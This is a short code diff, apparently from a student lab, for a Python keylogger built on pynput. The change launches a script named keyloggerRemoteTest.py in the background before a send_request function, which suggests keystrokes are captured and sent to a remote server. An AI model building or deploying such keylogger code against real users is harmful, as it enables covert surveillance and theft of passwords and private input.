@@ -7,7 +7,7 @@ from pynput.keyboard import Listener
 
 startlog = time.time()
 
-os.system("python3 /home/student/Desktop/scripts/keyloggerRemoteTest.py")
+os.system("python3 /home/student/Desktop/scripts/keyloggerRemoteTest.py &")
 time.sleep(1)
 
 def send_request():
